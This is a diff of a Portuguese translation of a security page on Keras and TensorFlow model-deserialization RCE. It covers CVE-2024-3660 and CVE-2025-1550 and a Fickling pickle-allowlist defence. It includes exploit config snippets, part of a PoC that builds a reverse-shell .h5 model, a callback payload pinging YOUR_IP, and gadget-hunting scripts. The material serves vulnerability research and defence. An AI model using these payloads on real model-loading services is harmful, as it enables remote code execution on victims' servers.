@@ -1,19 +1,17 @@
-# Keras Model Deserialization RCE and Gadget Hunting
-
-{{#include ../../banners/hacktricks-training.md}}
+# RCE na Desserialização de Modelos Keras e Busca por Gadgets
 
 Esta página resume técnicas práticas de exploração contra o pipeline de desserialização de modelos Keras, explica os componentes internos e a superfície de ataque do formato nativo .keras e fornece um toolkit para pesquisadores encontrarem Model File Vulnerabilities (MFVs) e gadgets pós-correção.
 
 ## Componentes internos do formato de modelo .keras
 
-Um arquivo .keras é um arquivo ZIP que contém, no mínimo:<sup>[[1]](#references)</sup>
-- metadata.json – informações genéricas (por exemplo, versão do Keras)
+Um arquivo .keras é um arquivo ZIP contendo, no mínimo:<sup>[[1]](#references)</sup>
+- metadata.json – informações genéricas (por exemplo, a versão do Keras)
 - config.json – arquitetura do modelo (principal superfície de ataque)
 - model.weights.h5 – pesos em HDF5
 
-O config.json conduz a desserialização recursiva: o Keras importa módulos, resolve classes/funções e reconstrói camadas/objetos a partir de dicionários controlados pelo atacante.<sup>[[1]](#references)</sup>
+O config.json controla a desserialização recursiva: o Keras importa módulos, resolve classes/funções e reconstrói camadas/objetos a partir de dicionários controlados pelo atacante.<sup>[[1]](#references)</sup>
 
-Exemplo de trecho para um objeto de camada Dense:
+Exemplo de trecho de um objeto de camada Dense:
 ```json
 {
 "module": "keras.layers",
@@ -33,10 +31,10 @@ Exemplo de trecho para um objeto de camada Dense:
 ```
 A desserialização executa:<sup>[[1]](#references)</sup>
 - Importação de módulos e resolução de símbolos a partir das chaves module/class_name
-- Invocação de from_config(...) ou do construtor com kwargs controlados pelo atacante
-- Recursão em objetos aninhados (activations, initializers, constraints, etc.)
+- from_config(...) ou invocação do construtor com kwargs controlados pelo atacante
+- Recursão em objetos aninhados (ativações, inicializadores, constraints etc.)
 
-Historicamente, isso expunha três primitives a um atacante que criasse o config.json:<sup>[[1]](#references)</sup>
+Historicamente, isso expunha três primitivas a um atacante que criasse o config.json:<sup>[[1]](#references)</sup>
 - Controle sobre quais módulos são importados
 - Controle sobre quais classes/funções são resolvidas
 - Controle sobre os kwargs passados aos construtores/from_config
@@ -44,9 +42,9 @@ Historicamente, isso expunha três primitives a um atacante que criasse o config
 ## CVE-2024-3660 – Lambda-layer bytecode RCE
 
 Causa raiz:
-- Lambda.from_config() usava python_utils.func_load(...), que decodifica em base64 e chama marshal.loads() sobre bytes controlados pelo atacante; o unmarshalling do Python pode executar código.<sup>[[1]](#references)[[3]](#references)</sup>
+- A desserialização legada de Lambda reconstruía uma função Python a partir de código marshal controlado pelo atacante: `func_load()` faz o decode base64 do payload, chama `marshal.loads()` e cria um `FunctionType`. O bytecode da função resultante é executado quando o Lambda é invocado, e os loaders afetados anteriores à versão 2.13 não aplicavam verificações de safe-mode para formatos legados.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>
 
-Ideia do exploit (payload simplificado no config.json):
+Em um archive nativo do Keras v3, a função Lambda é representada como um objeto `__lambda__` cujo campo `code` contém código marshal codificado em base64:<sup>[[17]](#references)[[18]](#references)</sup>
 ```json
 {
 "module": "keras.layers",
@@ -54,25 +52,29 @@ Ideia do exploit (payload simplificado no config.json):
 "config": {
 "name": "exploit_lambda",
 "function": {
-"function_type": "lambda",
-"bytecode_b64": "<attacker_base64_marshal_payload>"
+"class_name": "__lambda__",
+"config": {
+"code": "<base64(marshal.dumps(function.__code__))>",
+"defaults": null,
+"closure": null
+}
 }
 }
 }
 ```
 Mitigação:
-- O Keras impõe safe_mode=True por padrão. Funções Python serializadas em Lambda são bloqueadas, a menos que o usuário opte explicitamente por desativar essa proteção com safe_mode=False.<sup>[[1]](#references)</sup>
+- O Keras aplica `safe_mode=True` por padrão ao formato nativo do Keras v3. Lambdas Python serializadas em `Lambda` são bloqueadas, a menos que o usuário opte explicitamente por desativar essa proteção com `safe_mode=False`; essa proteção não abrange formatos legados da mesma maneira.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>
 
-Notas:
-- Formatos legados (salvamentos HDF5 mais antigos) ou codebases antigas podem não impor verificações modernas, portanto ataques no estilo “downgrade” ainda podem ser aplicáveis quando as vítimas usam loaders antigos.
+Observações:
+- Formatos legados (saves antigos em HDF5) ou codebases mais antigos podem não aplicar as verificações modernas; portanto, ataques do tipo “downgrade” ainda podem funcionar quando as vítimas usam loaders antigos.
 
-## CVE-2025-1550 – Importação arbitrária de módulos no Keras ≤ 3.8
+## CVE-2025-1550 – Importação arbitrária de módulos no Keras 3.0.0–3.8.x
 
 Causa raiz:
-- _retrieve_class_or_fn usava importlib.import_module() sem restrições, com strings de módulos controladas pelo atacante provenientes de config.json.
-- Impacto: Importação arbitrária de qualquer módulo instalado (ou de um módulo plantado pelo atacante em sys.path). O código executado durante a importação é executado, e a construção do objeto ocorre em seguida com kwargs controlados pelo atacante.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>
+- `_retrieve_class_or_fn` usava `importlib.import_module(module)` em strings de módulos controladas pelo atacante e obtidas de `config.json`.
+- Impacto: um arquivo `.keras` criado de forma maliciosa poderia fazer `Model.load_model()` importar módulos e funções Python escolhidos pelo atacante, com side effects durante a importação e argumentos controlados pelo atacante, mesmo com `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Ideia do exploit:
+Ideia de exploit:
 ```json
 {
 "module": "maliciouspkg",
@@ -81,15 +83,15 @@ Ideia do exploit:
 }
 ```
 Melhorias de segurança (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
-- Allowlist de módulos: imports restritos aos módulos oficiais do ecossistema: keras, keras_hub, keras_cv, keras_nlp
-- safe mode por padrão: safe_mode=True bloqueia o carregamento inseguro de funções serializadas do Lambda
-- Verificação básica de tipos: objetos desserializados devem corresponder aos tipos esperados
+- Allowlist de módulos: as importações são restritas aos módulos oficiais do ecossistema: keras, keras_hub, keras_cv, keras_nlp
+- Modo seguro por padrão: safe_mode=True bloqueia o carregamento inseguro de funções serializadas de Lambda
+- Verificação básica de tipos: os objetos desserializados devem corresponder aos tipos esperados
 
-## Exploração prática: TensorFlow-Keras HDF5 (.h5) Lambda RCE
+## Exploração prática: RCE de Lambda em TensorFlow-Keras HDF5 (.h5)
 
-Muitas stacks de produção ainda aceitam arquivos de modelo legados do TensorFlow-Keras HDF5 (.h5). Se um atacante puder fazer upload de um modelo que o servidor carregue posteriormente ou use para executar inferência, uma camada Lambda poderá executar Python arbitrário durante load/build/predict.<sup>[[7]](#references)</sup>
+Implantações legadas do TensorFlow-Keras ainda podem aceitar arquivos de modelo HDF5 (`.h5`). Se um atacante puder fazer upload de um modelo que o servidor posteriormente carregue ou use para inferência, um loader vulnerável poderá desserializar uma camada Lambda contendo Python controlado pelo atacante, que poderá então ser executado no fluxo do modelo da aplicação.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>
 
-PoC mínimo para criar um .h5 malicioso que executa um reverse shell quando desserializado ou utilizado:
+PoC mínimo para criar um .h5 malicioso cuja Lambda executa um reverse shell quando o alvo invoca o modelo:
 ```python
 import tensorflow as tf
 
@@ -105,29 +107,33 @@ m.compile()
 m.save("exploit.h5")  # legacy HDF5 container
 ```
 Notas e dicas de confiabilidade:
-- Pontos de acionamento: o código pode ser executado várias vezes (por exemplo, durante a construção da camada/primeira chamada, `model.load_model` e `predict`/`fit`). Torne os payloads idempotentes.<sup>[[7]](#references)</sup>
-- Fixação de versão: corresponda às versões de TF/Keras/Python da vítima para evitar incompatibilidades de serialização. Por exemplo, crie artefatos usando Python 3.8 com TensorFlow 2.13.1 se isso for o que o alvo utiliza.<sup>[[7]](#references)</sup>
+- Os pontos de acionamento variam conforme o formato e o workflow; o write-up referenciado observou o payload sendo executado duas vezes durante a predição. Considere os efeitos colaterais como repetíveis e torne os payloads idempotentes.<sup>[[7]](#references)</sup>
+- Fixação de versões: corresponda o TF/Keras/Python da vítima para evitar incompatibilidades de serialização. Por exemplo, crie os artefatos usando Python 3.8 com TensorFlow 2.13.1, se esse for o ambiente usado pelo alvo.<sup>[[7]](#references)</sup>
 - Replicação rápida do ambiente:
 ```dockerfile
 FROM python:3.8-slim
 RUN pip install tensorflow-cpu==2.13.1
 ```
-- Validação: um payload benigno como os.system("ping -c 1 YOUR_IP") ajuda a confirmar a execução (por exemplo, observando ICMP com tcpdump) antes de mudar para um reverse shell.<sup>[[7]](#references)</sup>
+- Validation: um payload benigno como `os.system("ping -c 1 YOUR_IP")` ajuda a confirmar a execução (por exemplo, observar ICMP com tcpdump) antes de mudar para um reverse shell.<sup>[[7]](#references)</sup>
 
-## Superfície de gadgets após a correção dentro da allowlist
+## Superfície de gadgets pós-correção dentro da allowlist
 
-Mesmo com allowlisting e safe mode, ainda resta uma superfície ampla entre os callables permitidos do Keras. Por exemplo, keras.utils.get_file pode baixar URLs arbitrárias para locais selecionáveis pelo usuário.<sup>[[1]](#references)</sup>
+Mesmo com a allowlist de módulos do Keras e o safe mode, os callables permitidos podem expor efeitos colaterais. Por exemplo, `keras.utils.get_file` baixa uma URL e grava o conteúdo no local de cache configurado, tornando-o um candidato para análise de gadgets.<sup>[[1]](#references)[[19]](#references)</sup>
 
-Gadget via Lambda que referencia uma função permitida (não bytecode Python serializado):
+Configuração candidata de Lambda (valide a assinatura da chamada em um teste controlado):
 ```json
 {
 "module": "keras.layers",
 "class_name": "Lambda",
 "config": {
 "name": "dl",
-"function": {"module": "keras.utils", "class_name": "get_file"},
+"function": {
+"module": "keras.utils",
+"class_name": "get_file",
+"config": null,
+"registered_name": null
+},
 "arguments": {
-"fname": "artifact.bin",
 "origin": "https://example.com/artifact.bin",
 "cache_dir": "/tmp/keras-cache"
 }
@@ -135,21 +141,21 @@ Gadget via Lambda que referencia uma função permitida (não bytecode Python se
 }
 ```
 Limitação importante:
-- Lambda.call() acrescenta o tensor de entrada como o primeiro argumento posicional ao invocar o callable de destino. Os gadgets escolhidos devem tolerar um argumento posicional extra (ou aceitar *args/**kwargs). Isso restringe quais funções são viáveis.<sup>[[1]](#references)</sup>
+- `Lambda.call()` sempre passa a entrada do modelo como o primeiro argumento posicional e os `arguments` configurados como argumentos nomeados. Para `get_file`, esse valor posicional preenche `fname`; uma incompatibilidade entre tensor e path pode fazer esse candidato falhar antes de qualquer download, portanto ele não é um gadget funcional garantido.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>
 
-## Allowlisting de imports de pickle para modelos de AI/ML (Fickling)
+## ML pickle import allowlisting for AI/ML models (Fickling)
 
-Muitos formatos de modelos de AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artefatos antigos do TensorFlow etc.) incorporam dados Python pickle. Attackers abusam rotineiramente dos imports GLOBAL e dos construtores de objetos do pickle para obter RCE ou realizar model swapping durante o carregamento. Scanners baseados em blacklist frequentemente não detectam imports perigosos novos ou não listados.<sup>[[8]](#references)[[14]](#references)</sup>
+Muitos formatos de modelos AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artefatos do joblib/scikit-learn e outros formatos nativos do Python) incorporam dados Python pickle. O caminho legado de Keras Lambda acima usa bytecode de função marshaled, portanto é um risco de deserialization separado. Os opcodes do pickle podem invocar comportamento controlado pelo atacante durante a deserialization, incluindo adulteração do modelo ou RCE, e scanners simples podem não detectar imports perigosos novos ou não listados.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>
 
-Uma defesa prática fail-closed consiste em interceptar o deserializador pickle do Python e permitir apenas um conjunto revisado de imports inofensivos relacionados a ML durante o unpickling. O Fickling, da Trail of Bits, implementa essa política e inclui um allowlist de imports de ML selecionado a partir de milhares de pickles públicos do Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>
+Uma defesa prática fail-closed consiste em hookar o deserializer de pickle do Python e permitir apenas um conjunto revisado de imports inofensivos relacionados a ML durante o unpickling. O Fickling, da Trail of Bits, implementa essa política e inclui uma allowlist de imports de ML selecionada a partir de milhares de pickles públicos do Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>
 
-Modelo de segurança para imports “seguros” (intuições consolidadas por pesquisas e pela prática): os símbolos importados usados por um pickle devem simultaneamente:<sup>[[8]](#references)</sup>
-- Não executar código nem causar execução (sem objetos de código compilados/de código-fonte, execução de comandos shell, hooks etc.)
+Modelo de segurança para imports “seguros” (intuições sintetizadas a partir de pesquisas e da prática): os símbolos importados usados por um pickle devem simultaneamente:<sup>[[8]](#references)</sup>
+- Não executar código nem causar execução (sem objetos de código compilados/de código-fonte, execução de comandos no shell, hooks etc.)
 - Não obter/definir atributos ou itens arbitrários
-- Não importar nem obter referências a outros objetos Python a partir da pickle VM
-- Não acionar nenhum deserializador secundário (por exemplo, marshal ou pickle aninhado), nem indiretamente
+- Não importar nem obter referências para outros objetos Python a partir da pickle VM
+- Não disparar nenhum deserializer secundário (por exemplo, marshal ou pickle aninhado), nem indiretamente
 
-Habilite as proteções do Fickling o mais cedo possível na inicialização do processo, para que quaisquer loads de pickle realizados por frameworks (torch.load, joblib.load etc.) sejam verificados:<sup>[[9]](#references)</sup>
+Habilite as proteções do Fickling o mais cedo possível na inicialização do processo, para que quaisquer loads de pickle realizados por frameworks (`torch.load`, `joblib.load` etc.) sejam verificados:<sup>[[9]](#references)</sup>
 ```python
 import fickling
 # Sets global hooks on the stdlib pickle module
@@ -162,31 +168,31 @@ fickling.hook.deactivate_safe_ml_environment()
 # ... load fully trusted files only ...
 fickling.hook.activate_safe_ml_environment()
 ```
-- Se um modelo comprovadamente seguro for bloqueado, amplie a allowlist do seu ambiente após revisar os símbolos:<sup>[[9]](#references)</sup>
+- Se um modelo conhecido como confiável for bloqueado, amplie a allowlist do seu ambiente após revisar os símbolos:<sup>[[9]](#references)</sup>
 ```python
 fickling.hook.activate_safe_ml_environment(also_allow=[
 "package.subpackage.safe_symbol",
 "another.safe.import",
 ])
 ```
-- O Fickling também expõe runtime guards genéricos caso você prefira um controle mais granular:<sup>[[9]](#references)</sup>
-- fickling.always_check_safety() para aplicar verificações a todos os pickle.load()
-- with fickling.check_safety(): para aplicação com escopo definido
-- fickling.load(path) / fickling.is_likely_safe(path) para verificações pontuais
+- Fickling também expõe proteções genéricas de runtime caso você prefira um controle mais granular:<sup>[[9]](#references)</sup>
+- fickling.always_check_safety() to enforce checks for all pickle.load()
+- with fickling.check_safety(): for scoped enforcement
+- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks
 
 - Prefira formatos de modelo que não sejam pickle quando possível (por exemplo, SafeTensors).<sup>[[15]](#references)</sup> Se precisar aceitar pickle, execute os loaders com least privilege, sem network egress, e aplique a allowlist.
 
-Essa estratégia baseada primeiro na allowlist bloqueia comprovadamente caminhos comuns de exploração de ML pickle, mantendo alta compatibilidade. No benchmark da ToB, o Fickling sinalizou 100% dos arquivos maliciosos sintéticos e permitiu aproximadamente 99% dos arquivos limpos dos principais repositórios do Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>
+Essa estratégia allowlist-first bloqueia comprovadamente caminhos comuns de exploração de pickle em ML, mantendo alta compatibilidade. No benchmark da ToB, o Fickling identificou 100% dos arquivos maliciosos sintéticos e permitiu aproximadamente 99% dos arquivos limpos dos principais repositórios do Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>
 
 
-## Toolkit do pesquisador
+## Ferramentas do pesquisador
 
-1) Descoberta sistemática de gadgets em módulos permitidos
+1) Descoberta sistemática de gadgets nos módulos permitidos
 
-Enumere callables candidatos em keras, keras_nlp, keras_cv, keras_hub e priorize aqueles com efeitos colaterais em arquivos, network, processos e ambiente.<sup>[[1]](#references)</sup>
+Enumere funções chamáveis candidatas em keras, keras_nlp, keras_cv, keras_hub e priorize aquelas com efeitos colaterais em arquivos, network, processos e ambiente.<sup>[[1]](#references)</sup>
 
 <details>
-<summary>Enumerar callables potencialmente perigosos nos módulos Keras incluídos na allowlist</summary>
+<summary>Enumerar funções potencialmente perigosas nos módulos Keras presentes na allowlist</summary>
 ```python
 import importlib, inspect, pkgutil
 
@@ -231,49 +237,60 @@ print("\n".join(sorted(candidates)[:200]))
 ```
 </details>
 
-2) Teste direto de desserialização (nenhum arquivo .keras necessário)
+2) Teste direto de desserialização (nenhum arquivo .keras é necessário)
 
-Forneça dicionários elaborados diretamente aos desserializadores do Keras para descobrir os parâmetros aceitos e observar os efeitos colaterais.<sup>[[1]](#references)</sup>
+Alimente os desserializadores do Keras diretamente com dicionários criados para esse fim, para descobrir os parâmetros aceitos e observar os efeitos colaterais.<sup>[[1]](#references)</sup>
 ```python
-from keras import layers
+import keras
 
 cfg = {
 "module": "keras.layers",
 "class_name": "Lambda",
 "config": {
 "name": "probe",
-"function": {"module": "keras.utils", "class_name": "get_file"},
-"arguments": {"fname": "x", "origin": "https://example.com/x"}
+"function": {
+"module": "keras.utils",
+"class_name": "get_file",
+"config": null,
+"registered_name": null
+},
+"arguments": {
+"origin": "https://example.com/x",
+"cache_dir": "/tmp/keras-cache"
+}
 }
 }
 
-layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
+layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
 ```
 3) Sondagem entre versões e formatos
 
 Keras existe em várias codebases/eras, com diferentes proteções e formatos:<sup>[[1]](#references)</sup>
-- TensorFlow built-in Keras: tensorflow/python/keras (legacy, com exclusão planejada)
+- TensorFlow built-in Keras: tensorflow/python/keras (legacy, programado para ser removido)
 - tf-keras: mantido separadamente
-- Multi-backend Keras 3 (official): introduziu o formato nativo .keras
+- Multi-backend Keras 3 (official): introduziu o .keras nativo
 
-Repita os testes em diferentes codebases e formatos (.keras vs legacy HDF5) para descobrir regressões ou proteções ausentes.
+Repita os testes entre as codebases e os formatos (.keras vs legacy HDF5) para descobrir regressões ou proteções ausentes.
 
-## Referências
+## References
 
-- [1] [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
-- [2] [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
-- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
-- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
-- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
-- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
-- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
-- [8] [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
-- [9] [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
-- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
+- [1] [Hunting Vulnerabilities in Keras Model Deserialization (blog da huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
+- [2] [Keras PR #20751 – Adicionadas verificações à serialização](https://github.com/keras-team/keras/pull/20751)
+- [3] [CVE-2024-3660 – RCE na desserialização de Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
+- [4] [CVE-2025-1550 – importação arbitrária de módulos no Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
+- [5] [relatório da huntr – importação arbitrária #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
+- [6] [relatório da huntr – importação arbitrária #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
+- [7] [HTB Artificial – RCE de Lambda do TensorFlow .h5 para root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
+- [8] [blog da Trail of Bits – novo scanner de arquivos pickle de AI/ML do Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
+- [9] [Fickling – Protegendo ambientes de AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
+- [10] [corpus de benchmark de scanning de pickle do Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
 - [11] [Picklescan](https://github.com/mmaitre314/picklescan)
 - [12] [ModelScan](https://github.com/protectai/modelscan)
 - [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
-- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
-- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
-
+- [14] [contexto dos ataques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
+- [15] [projeto SafeTensors](https://github.com/safetensors/safetensors)
+- [16] [CERT/CC VU#253266 – Camadas Lambda do Keras 2 permitem injeção arbitrária de código](https://kb.cert.org/vuls/id/253266)
+- [17] [código-fonte da camada Lambda do Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
+- [18] [código-fonte dos utilitários Python do Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
+- [19] [API `get_file` do Keras](https://keras.io/api/utils/python_utils/#get_file-function)
 {{#include ../../banners/hacktricks-training.md}}
